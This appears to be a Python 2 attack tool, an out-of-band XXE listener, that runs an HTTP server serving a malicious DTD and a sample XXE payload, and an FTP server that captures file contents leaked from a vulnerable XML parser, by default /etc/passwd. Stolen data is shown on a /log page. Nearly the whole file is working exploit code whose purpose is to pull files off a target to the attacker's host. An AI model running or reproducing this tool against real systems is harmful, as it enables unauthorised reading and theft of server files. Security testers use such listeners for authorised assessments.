from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from pyftpdlib.authorizers import DummyAuthorizer
import logging, os, sys, json, hashlib, re
from prompt_toolkit import prompt
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from json2html import json2html
from optparse import OptionParser
from pyftpdlib.log import config_logging
from threading import Thread
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SocketServer import ThreadingMixIn
from datetime import datetime

class XXE_FTPHandler(FTPHandler):
    #just support few ftp command for safe
    proto_cmds = {
        'PASV': dict(
        perm=None, auth=True, arg=False,
        help='Syntax: PASV (open passive data connection).'),
        'PORT': dict(
        perm=None, auth=True, arg=True,
        help='Syntax: PORT <sp> h,h,h,h,p,p (open active data connection).'),
        'RETR': dict(
        perm='r', auth=True, arg=True,
        help='Syntax: RETR <SP> file-name (retrieve a file).'),
        'PORT': dict(
        perm=None, auth=True, arg=True,
        help='Syntax: PORT <sp> h,h,h,h,p,p (open active data connection).'),
        'TYPE': dict(
        perm=None, auth=True, arg=True,
        help='Syntax: TYPE <SP> [A | I] (set transfer type).'),
        'CWD': dict(
        perm='e', auth=True, arg=None,
        help='Syntax: CWD [<SP> dir-name] (change working directory).'),
        'PASS': dict(
        perm=None, auth=False, arg=None,
        help='Syntax: PASS [<SP> password] (set user password).'),
        'USER': dict(
        perm=None, auth=False, arg=True,
        help='Syntax: USER <SP> user-name (set username).'),
        'QUIT': dict(
        perm=None, auth=False, arg=False,
        help='Syntax: QUIT (quit current session).'),
    }
    def ftp_RETR(self, file):
        self.respond('500 ERR')
        data = file[len(os.getcwd()) + 1:]
        print '[*] FTPD RETR recived data'
        global recv_messge
        md5 = hashlib.md5()
        md5.update(entity_location)
        key = md5.hexdigest()
        if not recv_messge.has_key(key):
            recv_messge[key] = {}
            recv_messge[key]['LOC'] = entity_location
            recv_messge[key]['FTPD_CWD'] = ''
        recv_messge[key]['FTPD_RETR'] = data
        return

    def ftp_CWD(self, path):
        self.respond('200 OK')
        data = path[len(os.getcwd()) + 1:]
        print '[*] FTPD CWD recived data'
        global recv_messge
        md5 = hashlib.md5()
        md5.update(entity_location)
        key = md5.hexdigest()
        if not recv_messge.has_key(key):
            recv_messge[key] = {}
            recv_messge[key]['LOC'] = entity_location
            recv_messge[key]['FTPD_CWD'] = ''
        recv_messge[key]['FTPD_CWD'] += data + '/'
        return
class XXE_HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/send.dtd':
            self.send_response(200)
            self.send_header('Content-Type', 'application/xml')
            self.end_headers()
            dtd = '''<!ENTITY % file SYSTEM "{0}">
<!ENTITY % any "<!ENTITY &#x25; send SYSTEM 'ftp://{1}/%file;'>">
%any;
            '''.format(entity_location, local_host)

            self.wfile.write(dtd)
            return
        if self.path == '/example':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            dtd = '''<?xml version="1.0"?>
<!DOCTYPE a [
	<!ENTITY % dtd SYSTEM "http://{0}/send.dtd">
	%dtd;
	%send;
]>
            '''.format(local_host)
            self.wfile.write(dtd)
            return
        if self.path == '/log':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            html = json2html.convert(json = json.dumps(recv_messge))
            self.wfile.write(html)
            return

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
class ThreadHTTPServer(ThreadingMixIn, HTTPServer):
    '''thread handle here'''
    pass

def thread_ftpd_daemon(bind = '0.0.0.0', port= 21, loglevel = logging.DEBUG):
    authorizer = DummyAuthorizer()
    authorizer.add_anonymous(homedir= u'.')
    handler = XXE_FTPHandler
    handler.authorizer = authorizer
    handler.banner = 'ftp daemon'
    server = FTPServer((bind, port), handler= handler)
    config_logging(level= loglevel)
    server.serve_forever()
def thread_httpd_daemon(bind = '0.0.0.0', port= 80):
    handler = XXE_HTTPHandler
    time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print '[I %s] >>> starting HTTP server on %s:%s' % (time, bind, port)
    httpd = ThreadHTTPServer((bind, port), handler)
    httpd.serve_forever()

def console_cmd_help(arc, arg):
    print '''
    XXE listener dengxun@360A-Team
        help    show this info
        path    set dtd entry location
    '''
def console_cmd_path(arc, arg):
    if arc == 0:
        print entity_location
        return
    path = ' '.join(arg)
    global entity_location
    entity_location = path

def console_cmd(cmd):
    if cmd == '':
        return
    arg = re.split(r'[\t\s]+', cmd)
    func = 'console_cmd_%s' % (arg.pop(0))
    arc = len(arg)
    if globals().has_key(func):
        eval(func)(arc, arg)
    else:
        print 'Unknown command.'

def console():
    history = InMemoryHistory()
    suggest = AutoSuggestFromHistory()
    session = PromptSession(history= history, auto_suggest= suggest)
    while True:
        cmd = session.prompt(u'%s >' % (entity_location))
        if cmd == 'exit':
            return
        console_cmd(cmd)

local_host = '127.0.0.1'
entity_location = 'file:///etc/passwd'
recv_messge = {}

def main(argc, args):
    parser = OptionParser()
    parser.add_option('-H', '--host', action= 'store', dest= 'local_host', help= 'set host info for xml dtd.')
    (options, args) = parser.parse_args()
    if options.local_host == None:
        print 'Must set local host info for xml dtd.'
        return
    else:
        global local_host
        local_host = options.local_host

    thread_ftpd = Thread(target= thread_ftpd_daemon, args= ('0.0.0.0', 21, logging.INFO))
    thread_ftpd.setDaemon(True)
    thread_httpd = Thread(target= thread_httpd_daemon, args= ('0.0.0.0', 80))
    thread_httpd.setDaemon(True)

    thread_ftpd.start()
    thread_httpd.start()
    console()

if __name__ == '__main__':
    main(len(sys.argv), sys.argv[1:])
